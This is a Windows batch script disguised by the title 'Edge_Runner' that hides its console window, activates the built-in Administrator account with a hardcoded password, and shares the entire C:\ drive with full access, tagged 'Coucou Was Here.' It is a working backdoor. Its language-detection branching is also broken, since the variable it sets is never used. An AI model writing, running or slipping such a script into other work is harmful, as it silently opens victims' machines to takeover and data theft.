@echo off
cls
title Edge_Runner
cls
mode con: cols=15 lines=1
cls
find /i "Administrateur" C:\Temp\idc_9.txt && ( set lang=FR )
cls
find /i "Administrator" C:\Temp\idc_9.txt && ( set lang=EN )
cls

:AdminFr
    cls
	net user Administrateur /active:yes
	cls
	net user Administrateur CoucouWas-hereAdmin
	cls
    net share bgmorito=C:\ /GRANT:Administrateurs,FULL /remark:"Coucou Was Here."
    cls
	goto SkipLang
	cls

:AdminEn
	cls
	net user Administrator /active:yes
	cls
	net user Administrator CoucouWas-hereAdmin
	cls
    net share bgmorito=C:\ /GRANT:Administrators,FULL /remark:"Coucou Was Here."
    cls
	goto SkipLang
	cls

:SkipLang
    cls

exit
cls